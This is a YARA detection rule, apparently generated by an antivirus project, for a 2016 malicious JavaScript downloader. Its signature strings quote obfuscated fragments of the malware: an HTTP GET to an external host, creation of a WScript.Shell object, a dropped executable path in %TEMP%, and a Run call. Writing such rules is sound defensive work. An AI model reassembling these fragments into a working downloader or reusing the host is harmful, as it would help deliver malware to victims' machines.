rule sig_20160330_88fbba5dddac749322a7b022e3738633 {
  meta:
    description = "datamaliciousorder - file 20160330_88fbba5dddac749322a7b022e3738633.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a73df3b28ef81afdf06d6ea1659d6396153c3feedf7983a229700eda936b67b5"

  strings:
    $s1  = "_NT[_D](\"GET\", \"http://smartbs-cameroun.com/nc7sjd\", false);" fullword ascii
    $s2  = "var _H = function _O() {return WScript[_KN](\"WScript\"+\".Shell\");}(), _K = 11;" fullword ascii
    $s3  = "function _B(_OY, _KW){_B0 = _B0 * 1; return _OY - _KW;};" fullword ascii
    $s4  = "if (_NT[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _EV() {return _H[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"10MJd7Jof.ex\" + \"e\";};" fullword ascii
    $s6  = "function _L(){return _N + \"\";};" fullword ascii
    $s7  = "function _GP() {return ((_VA == true) && (_VA == _CW)) ? 1 : _B0;};" fullword ascii
    $s8  = "function _JU(_C){_H[\"Run\"](_C, _B0, _B0);};" fullword ascii
    $s9  = "function _X()" fullword ascii
    $s10 = "function _SF(){return 22;};" fullword ascii
    $s11 = "var _CS = new this[\"Date\"]();" fullword ascii
    $s12 = "function _CV(){return _KN;};" fullword ascii
    $s13 = "return _B(_Y, _E0);" fullword ascii
    $s14 = "function _BX(_J) {var _X0 = (1, 2, 3, 4, 5, _J); return _X0;};" fullword ascii
    $s15 = " while (_JD){" fullword ascii
    $s16 = "_CW = true; " fullword ascii
    $s17 = "_VA = true; " fullword ascii
    $s18 = "var _CO = false;" fullword ascii
    $s19 = "var _VA = false;" fullword ascii
    $s20 = "var _CW = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}